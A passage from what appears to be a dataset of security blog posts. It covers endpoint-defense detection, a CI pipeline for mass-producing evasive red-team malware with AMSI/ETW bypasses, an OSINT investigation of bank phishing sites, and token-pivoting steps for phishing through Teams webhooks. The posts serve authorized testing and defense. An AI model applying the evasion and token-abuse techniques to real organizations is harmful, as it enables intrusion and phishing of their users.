itself.\n\nSome easy detection opportunities arise from memory page scanning:\n\nIf virtual memory is allocated and protections are set to READ, WRITE, and EXECUTE, then it is pretty much guaranteed to be malicious.\n\nThe reason that READ, WRITE, and EXECUTE permissions on virtual memory pages is an indicator of compromise is related to how virtual memory is used in a typical Windows process. Executable machine code in say the \u201c.text\u201d section of a PE/COFF executable will typically be mapped into virtual memory pages set to READ and EXECUTE only.As the code in a process executes, memory is going to be modified either on a thread\u2019s stack or the heap, with some additional fixed symbolic information mapped from the \u201c.data\u201d section of a PE/COFF module. In these use cases, we typically will see either READ ONLY permissions on virtual memory pages or READ/WRITE permissions.\n\nIf virtual memory is set to READ and EXECUTE and the memory is not backed by a DLL module image load when the thread is created, it is likely malicious.\n\nCommonly used shellcode, like those in the Metasploit project, Cobalt Strike, and others, have distinct known memory patterns that can be directly matched. Detection methods have also included heap allocation scans for Cobalt Strike profile data for example.\n\nNote: A related offensive evasion technique is to encrypt any heap data when a C2 client shellcode goes in/out of sleep mode.\n\nCall Stack Tracing/Analysis\n\nWhenever a process thread is created, a region of memory is always allocated for the thread\u2019s stack. The stack is organized into stack frames whereby every function call creates a new frame. A stack frame will contain local variables belonging to the specific function, as well as a function return address.\n\nAs any code in a thread executes, its stack will grow and shrink as various functions are called. This means that at any point in time, the thread\u2019s stack (sometimes referred to as the call stack) has a trail of evidence showing the sequence and depth of function calls.\n\nDefensive products can use a kernel callback to trigger \u201ccall stack analysis,\u201d which will unwind the call stack and most often check to see if any function calls were made from memory not backed by a DLL module/image loaded from disk.  \n\nA related concept to this is exception handling information in which the \u201c.pdata\u201d section of a 64-bit PE/COFF image contains function table entries containing exception handling code on a per function basis.\n\nFrom an offensive perspective, it is possible to write fake information into the call stack, making it look like all function calls are completely legitimate. This act will evade/defeat call stack tracing defenses.\n\nWindows 10/11 Hardware Enforced Stack Protection\n\nWith the introduction of Windows 11, and appropriate processor support, there exists a new defensive technique called Hardware Enforced Stack Protection. This feature will only work if the underlying processor provides support, such as Intel\u2019s Control-flow Enhancement Technology (CET) or AMD\u2019s shadow stacks.\n\nIn short, for all running processes, the return address of any function call is pushed onto both the process thread\u2019s call stack as well as a shadow stack maintained by the processor. Whenever a return instruction (RET) is encountered, the return addresses on both stacks are compared. If the addresses do not match then a control protection exception is issued. This exception is caught by the Windows kernel which in turn will terminate the offending process.\n\nSource: https://www.intel.com/content/dam/develop/external/us/en/documents/catc17-introduction-intel-cet-844137.pdf\n\nUsing shadow stacks for comparing function return addresses provides a defense against Return Oriented Programming (ROP) gadget use, as well as any attempt to fake a call stack thereby making any call stack analysis more effective.Within the same suite of protections, Intel has also implemented Indirect Branch Tracking (IBT), which is focused on defeating both Jump and Call Oriented Programming (COP/JOP) attack methods.\n\nKernel Driver Block Listing\n\nOne of the more attractive attacker targets that exists in the Microsoft Windows kernel environment is a signed driver that has a vulnerability.  With direct access to kernel memory via a vulnerable signed driver, any kernel mode data structure can be modified, including the ability to disable signed driver enforcement and load any custom driver that the attacker wishes to.\n\nIf a vulnerable driver already exists on an endpoint, some custom user mode application code can be written to exert control over that driver and perform further exploitation. If an attacker has privileges on a system, then an approach known as Bring Your Own Vulnerable Driver (BYOVD) can be used to install a driver for further exploitation. Once any level of control is established in the kernel, system security is completely compromised with no limits other than imagination for attacker capability.\n\nUnfortunately, driver development is a non-trivial endeavor, and there is a lot of code sharing that occurs in the community. On top of this, there are numerous devices and drivers going back in time that are used in different environments. This is a rich area of exploitation for threat actors today.\n\nAs such, with the introduction of Windows 11 as of the 2022 update, Microsoft has enabled the vulnerable driver blocklist. Microsoft runs a program for vulnerable driver submissions, and updates the vulnerable driver blocklist with each major release of Windows (about twice a year). Microsoft also provides a way to manually update the list using the Windows defender application control policy.\n\nUnfortunately, the Microsoft blocklist is far from comprehensive, and as you might imagine, it is very difficult to adequately maintain such a resource with so many devices and drivers in existence. Thus, there still exists many vulnerable and signed drivers today which are being actively exploited. Furthermore, there are lists of vulnerable drivers that are made available online.  One of these is here at https://www.loldrivers.io/\n\nConclusion\n\nThe list of techniques and descriptions above should now give you a good sense of why it is increasingly difficult to achieve a foothold on a Windows endpoint and perform post exploitation activities in a maturely instrumented environment. Having said that, initial access operations for Red Teamers are not impossible, just dependent on more sophisticated mature artifact generation techniques. In my opinion, achieving this requires an offensive DevOps approach. This is described in the next blog post, entitled \u201cInitial Access Operations Part 2 \u2013 Offensive DevOps\u201d (coming soon!).\n\nBe sure to tune in next Thursday, 2/29, at 1pm EST for Joff's webcast:\n\nExploring the Python \"psutil\" Module Under Windows w/ Joff Thyer\n\nLearn more and register HERE!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Initial Access Operations Part 2: Offensive DevOps\"\nTaxonomies: \"Informational, InfoSec 301, Joff Thyer, Red Team, devops, malwaredev\"\nCreation Date: \"Thu, 29 Feb 2024 14:00:00 +0000\"\n\nThe Challenge\n\nAs stated in PART 1 of this blog, the Windows endpoint defense technology stack in a mature organization represents a challenge for Red Teamer initial access operations. For initial access operation success in a well-instrumented environment, we typically need to meet a minimum bar for artifact use, such that:\n\nThe generated software artifact is unique to evade any static analysis detection.\n\nWindows event tracing is squelched in user mode artifact execution.\n\nKernel callback notifications are either \u201cnot interesting\u201d or, even better, are disabled.\n\nArtifact API use is not interesting enough to trigger some dynamic NTDLL API hooking behavior.\n\nParent child process relationships are not interesting from a process tree analysis perspective.\n\nAny process thread creation is preferably backed by some signed/legitimate disk (DLL module) artifact.\n\nSandbox execution will force our artifact to abort/terminate immediately.\n\nAny kernel level exploitation cannot use a driver on the block list.\n\nWhile the above is easy to write, the actual software/malware development techniques to achieve the goals are less trivial. To be fully effective, we need an ability to dynamically recompile malware artifacts to do things like changing the artifact size and entropy, use unique encryption keys, re-process incoming shellcode, provide the ability to introduce operator configurable options, artifact signing, and more. All these items point directly to employing a continuous integration/continuous development (CICD) approach to achieve a level of continuous defense evasion for produced artifacts. We employed the CICD feature set of GitLab Community Edition for implementing this approach. The following describes a generic approach I call, \u201cMalware As A Service (MAAS)\u201d and introduces a public repository as a template that you might employ to achieve similar goals.\n\nGitlab CICD Pipelines\n\nThe GitLab CICD pipeline is driven by an easily human digestible YML file syntax which can be enabled by putting a file named \u201c.gitlab-ci.yml\u201d in the home directory of a GitLab repository.\n\nThe YML syntax allows us to define build stages into the pipeline with different jobs associated with each stage.\n\nAny single pipeline run can be triggered by a \u201cgit commit\u201d and push or merge action for the repository.\n\nThe YML syntax allows us to define trigger actions which subsequently allows for dynamically created child pipelines.\n\nAny child pipeline is simply another YML file being triggered by the parent/global YML configuration.\n\nGitlab Runners\n\nA GitLab runner is software installed on a standalone server or virtual container that uses the GitLab API to poll a repository for pipeline jobs to be executed. When it first starts, a GitLab runner will register itself with the API, thus allowing it to subsequently service any pipeline jobs that are sent to it.\n\nThe runner will process instructions in the GitLab YML file, which, in most cases, will include the processing of a script indicated by the script tag in the YML content. The script is commonly executed by the native operating system \u201cshell,\u201d in the case of Windows, this might be CMD.EXE, and in the case of Linux, this might be /bin/bash or similar. The \u201cshell\u201d used is configurable and could be, for example, set to \u201cpwsh.exe\u201d or \u201cpwsh\u201d if you wanted a common shell syntax across platforms.\n\nBased on our software compilation needs, we chose to deploy both Windows-based runners, and Linux-based runners, with PowerShell configured on the Windows systems and the default /bin/bash shell configured on Linux runners, which we chose to deploy within Docker containers.\n\nThe specific architecture choice for using Docker was driven largely by the set of Python scripts which generate dynamic pipeline configuration information. Docker essentially eases the versioning and change control burden within the overall environment.\n\nIn our case, we do require full stack Microsoft compilation tools, as well as Linux-based mingw-gcc, Golang, Rust, and a full mono/.NET installation. This necessitated the deployment of both Windows- and Linux-based runner architecture with shared storage. The diagram below is our version 1.0 architecture.\n\nThe astute observer will notice that Docker is deployed on both Linux hosts, but not deployed in the Windows architecture case. While it is possible to run Docker on the Windows platform, at the time of this first version of architecture, there was a requirement to pick between HyperV Windows container mode or Linux container mode, and it simply became easier to deploy these servers in their native O/S form. You will also notice that this entire architecture is contained within an ESXi Hypervisor, which, in the future, will be scaled up and replicated for redundancy.\n\nArtifact Generation Docker Containers\n\nUsing Docker swarm and shared storage in the backend allows us to deploy dedicated Docker containers for dynamic malware generation. We currently have two different types of containers, one of which is a Python-based framework for compiling C#, Golang, and C/C++ source code, and a second which is dedicated to the Rust language and compiler.\n\nAs a part of the C#/.NET framework container system, we have deployed modules to perform source code obfuscation, various evasion techniques such as ETW and AMSI bypass patching, and code to perform PE/COFF fixes as needed, such as recalculation of PE header checksums, for example.\n\nCI/CD Pipeline Execution\n\nThe below diagram is captured from GitLab directly, showing various stages of pipeline execution. There are early preparation stages, artifact generation stages, dynamic child pipeline trigger stages, and post processing activities listed. Parts of the CI/CD pipeline perform dedicated tasks such as MSIX/AppX and ClickOnce package generation from existing malware artifacts, for example.\n\nPipeline job parallelization is achieved via both GitLab runner configuration options and multiple Docker container registration in the overall architecture. One of the dedicated containers uses the idea of resource script consumption, which allows us to split compilation jobs by architecture and compilation language. There are, of course, other ways to parallelize runner execution jobs, depending on the way that dynamic child pipeline YML configuration is generated.\n\nGitLab Runner YML Files and Python Generation Scripts\n\nThe master/parent pipeline script is contained in the \u201c.gitlab-ci.yml\u201d file, in the root directly of the repository. Within this file, dynamic child pipeline triggers are defined which call out to Python scripts used to generate more YML configuration for downstream stage execution of pipeline jobs. These generated YML file artifacts are passed down from earlier to later stages of the pipeline execution.\n\nThe diagram below is a snapshot of the master \u201c.gitlab-ci.yml\u201d file showing numerous aspects including pipeline stages, workflow rules for global pipeline triggering actions, and the initial preparation stage, which dynamically generates some YML for downstream stages.\n\nFor completeness, I have also included a screenshot of the configuration section showing the dynamic trigger dependencies executed as part of the \u201cBakingMalware\u201d stage of the pipeline.\n\nHow to Operate the Malware Artifact Generation Pipeline\n\nThere are numerous potential inputs that a Red Team operator might need to supply. These might be anything from supplying shellcode itself, configurating various evasion switches, IP address information, URL\u2019s and more.\n\nWe fondly refer to our internal pipeline as a Payload or Malware Buffet, and, as such, I provide a configuration file called \u201cBuffetConfig.yml\u201d which the operator must edit in order to subsequently push up the changes and trigger the pipeline execution. This particular YML file is processed by various scripts inside the pipeline execution and is distinctly different from the YML content that drives the pipeline itself.\n\nTo further enhance and standardize our configuration, the default parameters of this \u201cBuffetConfig.yml\u201d file are now represented within Python classes using Python \u201cpydantic\u201d models. This step allows us to move further towards automated triggering of this pipeline by other operational deployment software in our organization. On our roadmap is also to provide a web interface directly for configuration purposes.\n\nThis diagram is an example of what a portion of this \u201cBuffetConfig.yml\u201d file contains. Note that \u201cZulu Foxtrot\u201d is a reference to a malware artifact generation container.\n\nExpected Results from a Pipeline Execution\n\nWhen the pipeline is triggered and all of the stages have executed, we have \u2014 in post processing \u2014 stages which produce ZIP files of the generated artifacts to be used by Red Team operators. There will be multiple ZIP files containing items like the raw artifacts themselves (EXE, DLL, reflexive DLL\u2019s, XLL\u2019s and other desired files), manifest information, MSIX/AppX, ClickOnce, and other packaging methods.\n\nUsing a modest configuration with only one artifact generation container configurated, example results are as follows:\n\n57 binary artifacts and HTML-based MANIFEST19 EXE\u2019s of both the Windows managed (.NET), and native unmanaged variety26 DLL\u2019s both managed and unmanaged4 RDLL\u2019s (reflexive native/unmanaged)\n\n6 XLL\u2019s (Excel DLLs)\n\n9 MSIX/AppX packages.\n\n9 Click Once packages.\n\nOver 1GB of total data content produced with a modest 20Mb artifact inflation (entropy reducer) configuration in place.\n\nMetrics and Tracking\n\nOne of the last post processing stages of the pipeline uses a Python script which calculates various hashes (MD5, SHA1, and SHA256) of produced artifacts and writes the result into a SQLITE database with date/timestamp information for tracking purposes.\n\nThis data allows us to do numerous things, including producing summaries of artifact generation over time in graphical formal. The diagram below shows some artifact generation statistics from the pipeline during the month of September 2023.\n\nAdvantages of CI/CD Approach\n\nCombined with the docker container frameworks, we can achieve automated unique binary artifact generation delivery on every single pipeline run. This includes a large diversity of artifact types with unique encryption key generation for any embedded artifacts, and unique source code obfuscation techniques.\n\nThe overall pipeline approach gives us flexibility to add or modify new malware development techniques in a systematic way and make them quickly available to Red Team operators. The pipeline also opens up opportunities for different forms of pre and post processing, whether this be further embedded shellcode encoding, for example, or in the form of post artifact repackaging. There is no doubt that this approach enables us to deliver defense bypass techniques that easily evade static artifact analysis phases, and instead move the burden up/raise the bar to behavioral analysis in artifact execution.\n\nDisadvantages of CI/CD Approach\n\nThe pipeline configuration and execution has significant complexity. There are many software dependencies in the form of multiple language compilers, multiple different tools, and versioning concerns on the GitLab runners.\n\nIn addition, the speed of CI/CD pipeline troubleshooting is a challenge with an average pipeline run taking anywhere from 3 to 10 minutes. The current architecture is oversensitive to simple syntax errors in configuration input with an increasing level of Python script bloat to drive the dynamic elements.\n\nUsing \u201cgit\u201d itself is not an ideal operator user interface, with a move towards a frontend web interface approach remaining on the roadmap to improve this aspect.\n\nLastly, the Red Team operators do suffer from a certain overwhelming factor due to the large diversity of artifacts produced. This could be phrased as a \u201ctoo many toys to play with\u201d sort of problem. Reminding operators to \u201cRead the Manifest\u201d is an aspect of this, however, there is potential in the future to introduce configuration presets to help in the uncertainty and overwhelming aspect of pipeline execution results.\n\nMiscellaneous Penetration Tester Comments\n\nAfter having achieved a degree of successful adoption of this technology, I decided to informally poll our penetration testers about this creation. I asked this question: \u201cHow many hours would it take you to manually produce the necessary evasive artifacts that you now get automatically from the malware buffet pipeline?\u201d\n\nThe responses and ensuing discussion are summarized by these thoughts:\n\nWe think this saves 8 \u2013 16 hours of time per customer engagement.\n\nMy development skills are limited, and this pipeline is an invaluable/critical resource for me.\n\nBefore this existed, I would spend 2 days fumbling around on the internet and compiling various proof of concept (POC) code, just hoping that it would work for me.\n\nYour work has changed how I operate. I now focus a lot more on the engagement operation itself.\n\nYour work has brought a lot more consistency across our customer engagements.\n\nConclusion\n\nIt should be noted that the underlying technologies employed in the pipeline are many and varied, including both published projects online, as well as software written here at Black Hills Information Security. In the process of developing evasive malware artifacts, there are many techniques, and we stand on the shoulders of a great many people in our community willing to share research and resources.\n\nFrom the CI/CD development perspective, I have put together a resource which should be viewed as a templated approach for standing up your own pipeline projects. It\u2019s sort of a \u201cpaint by numbers\u201d guideline effort which you can find here at:  https://github.com/yoda66/MAAS\n\nNotable tools and projects that went into many aspects of development include the following:\n\nWinDBG \u2013 yes, the Windows Debugger. Look for the MS app store version!\n\nSystem Informer\n\nhttps://systeminformer.sourceforge.io\n\nSysInternals Process Explorer\n\nhttps://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer\n\nAPI Monitor\n\nhttp://www.rohitab.com/apimonitor\n\nMS Visual Studio, Mono, and Mingw-w64 cross compiler\n\nPython3 for many YML generation scripts\n\nPE-SIEVE\n\nhttps://github.com/hasherezade/pe-sieve\n\nDnSpy\n\nhttps://github.com/dnSpy/dnSpy\n\nResource Hacker\n\nhttps://www.angusj.com/resourcehacker/\n\nMany different .NET Obfuscation Technologies and Projects\n\nSysWhispers3\n\nhttps://github.com/klezVirus/SysWhispers3\n\nIn addition, there are many fine individuals and companies who are kind enough to share blogs and articles about various development and evasion techniques. Here is a list of various resources I have turned to at various times. Of course, given the nature of our work, published information is changing all the time. I hope you enjoyed reading this and gained some insight into techniques and methodology that you might choose to employ in your work also.\n\nhttps://docs.gitlab.com/ee/ci/\n\nhttps://defuse.ca/online-x86-assembler.htm\n\nhttps://www.blackhillsinfosec.com/avoiding-memory-scanners/\n\nhttps://www.elastic.co/fr/security-labs/upping-the-ante-detecting-in-memory-threats-with-kernel-call-stacks\n\nhttps://www.cobaltstrike.com/blog/behind-the-mask-spoofing-call-stacks-dynamically-with-timers\n\nhttps://jsecurity101.medium.com/uncovering-windows-events-b4b9db7eac54\n\nhttps://codemachine.com/articles/x64_deep_dive.html\n\nhttps://www.crowdstrike.com/blog/crowdstrikes-advanced-memory-scanning-stops-threat-actor/\n\nhttps://securityintelligence.com/x-force/direct-kernel-object-manipulation-attacks-etw-providers/\n\nhttps://www.mdsec.co.uk/2023/09/nighthawk-0-2-6-three-wise-monkeys/\n\nREAD: PART 1\n\nBe sure to catch Joff's webcast Exploring the Python \"psutil\" Module Under Windows TODAY at 1pm EST (Pre-show banter starts at 12:30pm). Recording available. \n\nFind it here: https://www.youtube.com/live/_cTiTHZfewY\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"OSINT for Incident Response (Part 2)\"\nTaxonomies: \"Incident Response, Informational, Patterson Cake, OSINT\"\nCreation Date: \"Thu, 07 Mar 2024 16:00:00 +0000\"\n\nBe sure to read PART 1!\n\nMetadata and a New-Fashioned Bank Robbery \n\nLet\u2019s face it, some cases are just more interesting than others and, when you do incident response for a living, you\u2019ve got to find joy in your work where you can. Sometimes, after the initial call with a customer, you just want the case. You\u2019d almost do it for free (we don\u2019t suck at capitalism quite that much!) because of the allure, the mystery, the challenge. This was one of those cases.\n\nThe customer was a financial services institution with locations throughout the United States, highly regulated, with highly segregated technology and workflow. They had defense-in-depth security solutions from the endpoint to the perimeter, micro-segmentation throughout their environment, extensive auditing and monitoring capabilities, complete with separation of duties for all workflow involving significant financial transactions. In short, they were checking all the \u201ccybersecurity best practices\u201d boxes and then some. But they were still getting robbed.\n\nI\u2019m sure all financial services institutions suffer from some measure of loss due to fraudulent transactions. But FFSI Bank (\u201cFictitious Financial Services Institution Bank,\u201d because that\u2019s just how creative I am) was seeing a significant increase in fraudulent activity for a specific type of transaction over a period of recent months. Because they ran such a tight ship, they\u2019d caught and stopped most of the transactions, but despite extensive, internal analysis, they\u2019d failed to identify or stop the source.\n\nOn the initial call, they were clearly a very smart and capable group and seemed frustrated and a little embarrassed that they were unable to figure this out on their own. Could it be an insider threat with multiple, internal collaborators? Might it be some new, extremely stealthy malware? Was it possible that their multiple layers of security and segmentation had somehow been breached from the outside?\n\n The part that isn\u2019t fun about engagements like this is preparing the proposed statement of work. \u201cHey, Derek, how many hours you think this is going to take?\u201d To which Derek replies, \u201cOh, somewhere between 40 and 400.\u201d Exactly. I mean, these are smart folk with some pretty cool capabilities. To do \u201cbetter,\u201d we\u2019ll need to dig deeper, further, wider. But first\u2026 OSINT.\n\nWe went back to the customer, warned them that this could get expensive, but proposed spending a few hours performing some external analysis first, to see what we could \u201csee\u201d and learn from the internet.\n\nAs per \u201cOSINT for Incident Response \u2013 Part 1,\u201d a compromise usually occurs because something changed, from misconfigurations to zero-day exploits to end-user behaviors, and the avenue of attack is most frequently the internet. If the internet knows, the threat actors (bank robbers?) know, and as incident responders, we need to know!\n\nI have a standard 5-minute OSINT for IR process (see Part 1) which I ran through. I was fairly certain this wasn\u2019t going to be that easy, but it was still a good place to start and yielded some useful information, though no smoking guns.\n\nMuch of OSINT is reviewing intentionally \u201cpublic\u201d information, like DNS records, then sleuthing out tangential or inferred data. For example, if FFSI has a DNS \u201cA\u201d record mapping the name \u201cportal.ffsibank.com\u201d to 50.x.x.100 and another mapping \u201csupport.ffsibank.com\u201d to 50.x.x.102, we can hypothesize that 50.x.x.101 likely belongs to FFSI (subject to validation of course). If I pull on that particular thread, lookup 50.x.x.101 and find reverse DNS records that map to \u201cdev.ffsibanking.com,\u201d which is slightly different (\u201cbank\u201d vs \u201cbanking\u201d) but pretty clearly related, I now have additional domains to enumerate!\n\nSadly, in this case, I pulled on all the \u201cIP address and DNS/domain\u201d threads and nothing unraveled. So, I scratched my head a bit, mused about how to go \u201cdeeper, further, wider,\u201d and pondered the question: \u201cWhat is the most granular search query I can perform that still uniquely identifies the customer?\u201d I can\u2019t very well search for \u201cF\u201d or \u201cFF\u201d and obtain useful results, but what if I base OSINT searches on \u201cFFSI\u201d or \u201cFFSIB\u201d or \u201cffsibank?\u201d\n\nSo, I visited https://shodan.io, ran these queries, and came up empty. Then I visited https://leakix.net and got a promising hit for \u201cffsibank.\u201d  Apologies that the images are so redacted, but they are hopefully still representative! Ironically, the result below is an actual, fairly recent hit on a related search term (\u2018visit_log.txt\u2019 - see below) for an entirely different non-fictional financial institution.\n\nLeakix.net \u2013 Search Term Results (\u201cffsibank\u201d)\n\nBased on my leakix.net results, I suddenly have multiple additional threads to pull on, including a new IP address, a domain name, a service provider (Digital Ocean), a geographical location, etc. Which do I pull on first? Honestly, I want to browse the site in question, but I want to do it safely and from an unattributable IP, as I don\u2019t want to tip my hand to the threat actor if I can avoid it. Browserling to the rescue! Browserling is basically a hosted, virtualized browser session primarily designed for web testing and development. You can use it for free, with some limitations, or pay a very reasonable price to extend features: www.browserling.com\n\nI started by visiting the bare URL, \u201cmail.redacted-pid.com,\u201d where I was torn between doing my personal banking or trying my luck at some digital slots! Apologies for the intentionally blurry screenshot, as it is actually from case data.\n\nBrowserling \u2013 visit to the \u201csuspect\u201d domain\n\nWhy would a Cambodian gambling site have references to \u201cffsibank?\u201d And isn\u2019t this supposed to be a \u201cmail\u201d server? The plot thickens! Let\u2019s see if we can find the \u201cffsibank\u201d reference while \u201csafely\u201d browsing through Browserling.\n\nBrowsing \u201cmail.redacted-pid.com\u201d \u2013 \u201cffsibank\u201d folder\n\nBrowsing the site contents reveals an \u201cffsibank\u201d folder. The contents of that folder turn out to be high-quality imitations of the \u201cFFSI\u201d Bank customer login portal.\n\nBrowsing the contents of the \u201cffsibank\u201d folder (simulated)\n\nSmoking gun? Yeah, I think so. But we\u2019re not done yet! What else can we see, learn, extrapolate? Do you think this is the only site attempting to mirror the \u201cFFSI\u201d Bank customer portal?\n\nReturning to the parent directly, as above, note the \u201cvisit_log.txt\u201d file. We want to be very careful accessing content on the site, so we can attempt it via Browserling or perhaps you have another, authorized mechanism for visiting \u201csuspicious\u201d websites, like curl or wget (command-line web browsers) on an isolated virtual machine (that\u2019s an entirely different blog post!). In this case, the file was legitimately just a text file, containing user-agent strings (information about the browser used for access) and IP addresses for everyone who\u2019d been duped into visiting the folders in the \u201cIndex of\u201d image above. A smoking gun and a gold mine in one fell swoop!\n\nWhat about other potentially malicious sites? Let\u2019s pull on the \u201ccertificate\u201d thread and see what we can find! Next, I visited https://search.censys.io to leverage their certificate services search features. Since modern browsers are very aware of \u201cinsecure\u201d sites or certificate to domain name misalignments, the threat actors are often smart enough to use \u201chttps\u201d and a valid certificate. After all, they can now easily do so for free.\n\nOn search.censys.io, I\u2019ll start with a \u201cCertificates\u201d wildcard search \u2018names: \u201cffsib*\u201d\u2019 first, then, depending on results, I\u2019ll likely drill down to a specific, free certificate services provider, e.g. \u201cLet\u2019s Encrypt.\u201d\n\nSearch.censys.io \u2013 Certificates \u201cffsib*\u201d Search\n\nHow do you spell \u201cbank\u201d anyway? When I first performed the wildcard name search, there were approximately 425+ returned results, many of which were likely valid/legit. But I noticed a pattern of three or four certificates with \u201ccommon name\u201d (CN) and a slight misspelling of the word \u201cbank\u201d (as above). Re-running the search and filtering on \u201cLet\u2019s Encrypt\u201d as a certificate services provider, it became clear that there were indeed many more forged, malicious sites being used to target \u201cFFSI\u201d Bank customers.\n\nSearch.censys.io \u2013 Certificates \u201cffsib*\u201d + \u201cLet\u2019s Encrypt\u201d Search\n\nAt this point, we\u2019re ready to report back to the customer with some pretty significant insight into targeted attacks against their customers. We\u2019re also able to derive high-fidelity intelligence to help identify existing malicious sites and monitor for new malicious sites, e.g. \u201cffsibank\u201d directory, \u201cvisit_log.txt\u201d file, \u201cLet\u2019s Encrypt\u201d associated certificate, etc. And I\u2019m happy to report that we accomplished all of this well below the \u201c40 to 400\u201d hour initially projected timeframes. OSINT for the win!\n\nAs mentioned in \u201cOSINT for IR \u2013 Part 1,\u201d being a digital-forensics and incident response consultant is largely about unanswered questions. When we engage with a client, they know something bad happened or is happening, but they are uncertain of the \u201chow, when, where and why.\u201d A significant component of our job is to tease out the \u201cknown knowns,\u201d the \u201cknown unknowns,\u201d and effectively and efficiently help the client answer their questions. OSINT for IR can be extremely valuable and should be part of the investigative process.\n\nCase #3: Metadata and Denial of Service via Domain Account Lockouts\n\nIn the next installment of \u201cOSINT for IR,\u201d we\u2019ll continue our metadata sleuthing adventures and unravel an enterprise-wide, Active Directory account lockout \u201cdenial of service\u201d attack. Thanks for reading!\n\nREAD: PART 1\n\nBe sure to tune in next Thursday, 3/14, at 1pm EDT for Patterson's webcast:\n\nDemystifying Windows Malware Investigations w/ Patterson Cake\n\nYou can register HERE!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Wishing: Webhook Phishing in Teams\"\nTaxonomies: \"External/Internal, Matthew Eidelberg, Phishing, Red Team, Red Team Tools, Persistence, Teams, Webhooks\"\nCreation Date: \"Thu, 14 Mar 2024 13:10:52 +0000\"\n\nQuick Jump:\n\nWhat Are Microsoft Connectors?\n\nWhat Are Webhooks?\n\nHow Do We Get These Webhooks?\n\nSo, What Can We Do with These Webhooks?\n\nEnumerating Channels\n\nCreate Your Own Webhooks\n\nChannel Emails Enumeration\n\nSending Channel Emails\n\nDefender Insight\n\nIn the constantly evolving landscape of cybersecurity, it is common to see features designed for convenience lead to negative cybersecurity consequences. Microsoft Teams, an essential tool for corporate communication, contains features and configurations that are susceptible to abuse. The following items are particularly ripe for abuse:\n\nBy default, users can configure incoming webhooks in any channels they have access to.\n\nBy default, users can view unique webhook URLs created by other users in any channel they have access to.\n\nAt time of writing, webhooks cannot be configured to use authentication.\n\nTeams has an obscure feature to create an email address for a given channel. This email can be abused to send phishing messages to an organization\u2019s Teams channels.\n\nThe end result for attackers is a variety of ways to abuse Teams for post-exploitation, mainly to send phishing messages. This article will explore these vulnerabilities in detail, discussing their implications for organizations.\n\nWhat Are Microsoft Connectors?\n\nFirst, let\u2019s provide some context around the Teams connectors feature. Microsoft Teams connectors allow users to integrate external services and tools directly into their Teams channels and conversations. They are designed to enhance team collaboration by bringing in content and updates from various external applications, services, or platforms, making them easily visible to all members of a channel. Some common examples of connectors include Azure, GitHub, Jira, Trello, RSS feeds, and many others. These updates are posted within the team\u2019s channel as messages, allowing team members to stay informed and react in real time without leaving the Teams interface.\n\nThese connectors can be easily created by any users in a channel by simply going to a given channel\u2019s settings and clicking on the edit button under \u201cConnectors.\u201d This provides you with a list of Microsoft-approved connectors to configure. It\u2019s important to note that there are hundreds of possible connectors.\n\nFigure 1 \u2013 Sample Connector Catalog \n\nOnce a connector is selected, the creation process is as simple as just naming your connector, filling in the required options and then creating it.\n\nFigure 2 \u2013 Creating a Connector\n\nAll these connectors are connected to Microsoft Teams using webhooks.\n\nFigure 3 \u2013 Connector\u2019s Webhook URL \n\nWhat Are Webhooks?\n\nWebhooks are HTTP callbacks that are triggered by specific events. When such an event occurs, the source site makes an HTTP request to the URL configured for the webhook. The action performed by this HTTP request can vary \u2014 it could be data being sent (as in POST requests), data modification, or any number of different actions. The data sent is typically in the form of a JSON or XML payload, which is then processed by the receiving application.\n\nWebhooks are different from APIs in how they receive data. With an API, data is obtained through polling, where an application periodically makes requests to an API server to check for new data. In contrast, a webhook allows the server to push data to your application instantly when an event occurs, hence sometimes referred to as \"reverse APIs\" or \"push APIs.\" This makes webhooks less resource-intensive compared to APIs, as they eliminate the need for constant polling.\n\nWebhooks are particularly useful for automating tasks and integrating different software applications. They are quick to set up and can automate data transfer, saving time and resources. Microsoft allows webhook connectors as a simple way to connect an application to a Microsoft Teams channel inside Microsoft Teams. Incoming webhooks allow your users to send text messages from a channel to your web services. Connector-based webhooks allow users connect receive notifications and messages from your web services.\n\nSo why do we care about webhooks? Because we can use them to send messages into a Teams channel.\n\n This is great for phishing, as Teams messages avoid email filters. When phishing via a webhook, the message will appear as though it was sent by a legitimate connector app, which could lead to less suspicion from the target users.\n\nHow Do We Get These Webhooks?\n\nWe\u2019ve created a module within GraphRunner to enumerate configured webhooks that a compromised user has access to. If you want to try it out, run Get-Webhooks for more information. Now, let\u2019s walk through the reverse engineering process required to build this module. First, let\u2019s grab a bearer token for a target user, using Get-GraphTokens. If you aren\u2019t familiar with GraphRunner yet, please check it out HERE.  \n\nFigure 4 \u2013 GraphRunner \u2013 Getting GraphToken \n\nOnce we have this token, we can take it and pass it to https://login.microsoftonline.com/ with the scope of outlook.office365.com/connectors. Using Burp Suite, we can see the POST request and in that we receive an access_token that is tied to api.spaces.skype.com. This type of token will grant us access to skype (aka Microsoft Teams).\n\nFigure 5 \u2013 Access_token for api.spaces.skype.com\n\nNext, we take the contents of that access_token and rename it as a Single Sign-on token (\u201cSstoken\u201d), which is used for seamless authentication within Office and all its addons. This request is then passed to \u201coutlook.office.com/connectors/Manage/AuthorizeUsingToken?client=SkypeSpaces\u201d. This URI allows a user to authenticate to the management interface of the connectors using tokens. We specify the client as \"SkypeSpaces\", as that\u2019s the reference for Microsoft Teams.\n\nFigure 6 \u2013 GET Request to Connectors/Manage/AuthorizationUsingToken\n\nThe response we get provides us with a ton of cookies that grant access to Microsoft Teams\u2019 resources through office.com. These cookies are:\n\nBearerTokenFromWorkload\n\nSkypeSpaceTokens\n\n__RequestionVerificationToken_L2Nvbm51Y3RvCnM1 (yes, this random number is the same across different users)\n\n.AspNet.ApplicationCookie\n\nX-XSRF-Token\n\nFigure 7 \u2013 Response from Connectors/Manage/AuthorizationUsingToken\n\nThe important cookies are BearerTokenFromWorkload and SkypeSpaceTokens. These provide access to certain resources (in this case, because we pointed it at the \u201cconnectors,\u201d it will all be focused on the connector apps).\n\nDisclaimer: We inferred this information from reverse engineering, without official documentation from Microsoft. It could be wrong, or subject to change, as APIs evolve.\n\nThe BearerTokenFromWorkload tokens provide access to a resource, whereas SkypeSpacesTokens provides the type of access to the resource defined by the BearerTokenFromWorkload tokens. SkypeSpaceTokens are not well documented but allow certain features or integrations within Microsoft Teams. Very similar to Graphtokens, SkypeSpaceTokens allow for authentication and authorization within Microsoft Teams eco-space, particularly when integrating or enabling certain features, external applications, and connectors.\n\nFigure 8 \u2013 Decoded BearerTokenFromWorkload and 